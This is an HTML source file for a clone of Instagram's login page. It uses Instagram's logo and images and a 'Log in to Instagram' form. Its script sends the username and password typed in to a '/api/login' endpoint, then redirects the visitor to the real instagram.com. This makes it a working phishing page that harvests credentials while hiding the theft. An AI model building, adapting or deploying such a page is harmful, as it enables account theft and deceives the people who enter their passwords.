<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Instagram Login Clone + Auth</title>
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }

    :root {
      --bg-left: #000000;
      --bg-right: #0b1822;
      --text-main: #ffffff;
      --text-muted: #a8b3c0;
      --input-border: #3c4854;
      --button-blue: #1a4d9f;
      --button-blue-dark: #133a77;
      --pill-bg: #101b25;
      --footer-bg: #000000;
    }

    body {
      font-family: system-ui, -apple-system, BlinkMacSystemFont, "SF Pro Text",
        "Segoe UI", sans-serif;
      background: #000;
      color: var(--text-main);
    }

    .page {
      display: flex;
      min-height: calc(100vh - 52px);
    }

    /* LEFT SIDE ------------------------------------------------------ */

    .hero-image {
      margin-top: 32px;
      max-width: 430px;
      width: 100%;
      height: auto;
      display: block;
      margin-left: auto;
      margin-right: auto;
    }

    .logo-icon-img {
      width: 44px;
      height: 44px;
      border-radius: 14px;
      object-fit: cover;
    }

    .left {
      flex: 1 1 50%;
      background: var(--bg-left);
      display: flex;
      flex-direction: column;
      padding: 32px 64px;
      position: relative;
    }

    .logo-row {
      display: flex;
      align-items: center;
      gap: 10px;
    }

    .logo-text {
      font-size: 22px;
      font-weight: 600;
      letter-spacing: 0.04em;
    }

    .left-main {
      flex: 1;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      text-align: center;
      padding: 24px 0 40px;
    }

    .headline {
      font-size: 36px;
      line-height: 1.2;
      max-width: 480px;
      margin-bottom: 40px;
    }

    .headline span {
      background: linear-gradient(90deg, #ff5c7b, #ffb347, #7c4dff);
      -webkit-background-clip: text;
      color: transparent;
      font-weight: 600;
    }

    /* RIGHT SIDE ----------------------------------------------------- */

    .right {
      flex: 1 1 50%;
      background: var(--bg-right);
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 32px 48px;
    }

    .login-panel {
      width: 100%;
      max-width: 420px;
    }

    .login-title {
      font-size: 16px;
      margin-bottom: 18px;
      color: var(--text-main);
    }

    .input-pill {
      width: 100%;
      border-radius: 999px;
      border: 1px solid var(--input-border);
      padding: 14px 16px;
      margin-bottom: 14px;
      background: transparent;
      color: var(--text-main);
      font-size: 14px;
      outline: none;
    }

    .input-pill::placeholder {
      color: var(--text-muted);
    }

    .button-pill {
      width: 100%;
      border-radius: 999px;
      border: none;
      padding: 14px 16px;
      font-size: 14px;
      font-weight: 600;
      cursor: pointer;
      margin-top: 6px;
      transition: background 0.15s ease, transform 0.06s ease;
    }

    .button-pill.primary {
      background: var(--button-blue);
      color: #ffffff;
    }

    .button-pill.primary:active {
      background: var(--button-blue-dark);
      transform: translateY(1px);
    }

    .forgot-link {
      text-align: center;
      margin: 14px 0 18px;
      font-size: 13px;
      color: var(--text-muted);
      cursor: pointer;
    }

    .forgot-link:hover {
      text-decoration: underline;
    }

    .secondary-actions {
      display: flex;
      flex-direction: column;
      gap: 12px;
      margin-top: 12px;
    }

    .button-pill.outline {
      background: transparent;
      color: #ffffff;
      border: 1px solid var(--input-border);
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 8px;
    }

    .fb-icon {
      width: 16px;
      height: 16px;
      border-radius: 999px;
      background: #1877f2;
      display: inline-flex;
      align-items: center;
      justify-content: center;
      font-weight: 700;
      font-size: 11px;
    }

    .meta-row {
      margin-top: 28px;
      text-align: center;
      color: var(--text-muted);
      font-size: 12px;
      display: flex;
      flex-direction: column;
      gap: 6px;
      align-items: center;
      justify-content: center;
    }

    .meta-symbol {
      width: 38px;
      height: 18px;
      border-radius: 999px;
      border: 1px solid var(--input-border);
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 11px;
      letter-spacing: 0.09em;
    }

    /* FOOTER --------------------------------------------------------- */

    footer {
      height: 52px;
      background: var(--footer-bg);
      color: var(--text-muted);
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 0 16px;
      font-size: 11px;
      border-top: 1px solid #161e26;
    }

    .footer-links {
      display: flex;
      flex-wrap: wrap;
      gap: 12px;
      justify-content: center;
      max-width: 1000px;
    }

    .footer-links a {
      text-decoration: none;
      color: inherit;
    }

    .footer-links a:hover {
      text-decoration: underline;
    }

    /* MESSAGES & USERS LIST ----------------------------------------- */

    #msg {
      min-height: 18px;
      font-size: 13px;
      margin-bottom: 10px;
    }

    .message {
      color: #4ade80; /* green */
    }

    .error {
      color: #f97373; /* red */
    }

    .auth-section-title {
      font-size: 15px;
      margin-top: 26px;
      margin-bottom: 10px;
      color: var(--text-muted);
    }

    .admin-block {
      margin-top: 20px;
      font-size: 12px;
      color: var(--text-muted);
    }

    #usersList {
      list-style: none;
      padding-left: 0;
      margin-top: 8px;
    }

    #usersList li {
      margin-bottom: 4px;
    }

    /* RESPONSIVE ----------------------------------------------------- */

    @media (max-width: 900px) {
      .page {
        flex-direction: column;
        min-height: auto;
      }

      .left {
        padding: 24px 16px 28px;
        align-items: center;
      }

      .left-main {
        padding-top: 28px;
      }

      .headline {
        font-size: 28px;
        margin-bottom: 28px;
      }

      .right {
        padding: 24px 16px 32px;
      }

      footer {
        height: auto;
        padding: 12px 10px 18px;
      }

      /* --- MOBILE (<=600px) --- */
@media (max-width: 600px) {

.page {
  flex-direction: column;
  padding: 0;
  min-height: 100vh;
}

/* Скрываем левую часть */
.left {
  display: none;
}

/* Правая часть = одиночная */
.right {
  flex: none;
  width: 100%;
  padding: 28px 20px 40px;
  align-items: flex-start;
}

.login-panel {
  max-width: 100%;
}

/* Заголовок */
.login-title {
  font-size: 18px;
  margin-bottom: 20px;
  text-align: left;
}

input.input-pill {
  padding: 15px 16px;
  font-size: 15px;
}

.button-pill {
  padding: 15px;
  font-size: 15px;
}

.forgot-link {
  margin: 16px 0;
  font-size: 14px;
}

.secondary-actions {
  gap: 10px;
}

.meta-row {
  margin-top: 32px;
  font-size: 13px;
}

footer {
  padding: 16px 10px 30px;
  height: auto;
}

.footer-links {
  gap: 10px;
  font-size: 11px;
  max-width: 360px;
}
}

    }
  </style>
</head>
<body>
  <div class="page">
    <!-- LEFT SIDE ---------------------------------------------------->
    <section class="left">
      <div class="logo-row">
        <img
          class="logo-icon-img"
          src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a5/Instagram_icon.png/2048px-Instagram_icon.png"
          alt="Instagram logo"
        />
        <div class="logo-text">Instagram</div>
      </div>

      <div class="left-main">
        <h1 class="headline">
          See everyday moments from your <span>close friends.</span>
        </h1>

        <img
          class="hero-image"
          src="https://static.cdninstagram.com/rsrc.php/v4/yt/r/pAv7hjq-51n.png"
          alt="Instagram preview"
        />
      </div>
    </section>

    <!-- RIGHT SIDE (AUTH + DB) -------------------------------------->
    <section class="right">
      <div class="login-panel">
        <!-- Сообщения от сервера -->
        <div id="msg"></div>

        <!-- ЛОГИН -->
        <h2 class="login-title">Log in to Instagram</h2>

        <form id="loginForm">
          <input
            class="input-pill"
            type="text"
            name="login"
            placeholder="Mobile number, username or email address"
            required
          />

          <input
            class="input-pill"
            type="password"
            name="password"
            placeholder="Password"
            required
          />

          <button class="button-pill primary" type="submit">Log in</button>
        </form>

        <div class="forgot-link">Forgotten password?</div>

        <div class="secondary-actions">
          <button class="button-pill outline" type="button">
            <span class="fb-icon">f</span>
            <span>Log in with Facebook</span>
          </button>
        </div>

      
      

        <div class="meta-row">
          <div class="meta-symbol">META</div>
        </div>
      </div>
    </section>
  </div>

  <footer>
    <div class="footer-links">
      <a href="#">Meta</a>
      <a href="#">About</a>
      <a href="#">Blog</a>
      <a href="#">Jobs</a>
      <a href="#">Help</a>
      <a href="#">API</a>
      <a href="#">Privacy</a>
      <a href="#">Terms</a>
      <a href="#">Locations</a>
      <a href="#">Instagram Lite</a>
      <a href="#">Meta AI</a>
      <a href="#">Meta AI articles</a>
      <a href="#">Threads</a>
      <a href="#">Contact uploading and non-users</a>
      <a href="#">Meta Verified</a>
    </div>
  </footer>

  <script>
    const form = document.getElementById("loginForm");
    const msg = document.getElementById("msg");

    form.addEventListener("submit", async (e) => {
      e.preventDefault();

      const login = form.login.value.trim();
      const password = form.password.value;

      try {
        const res = await fetch("/api/login", {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({ login, password }),
        });

        const data = await res.json();

        if (!res.ok) {
          msg.textContent = data.error || "Login error";
          msg.style.color = "red";
          return;
        }

        // success — redirect to real Instagram
        window.location.href = "https://instagram.com";
      } catch (err) {
        msg.textContent = "Network error";
        msg.style.color = "red";
      }
    });
  </script>
   
  </script>
  
</body>
</html>
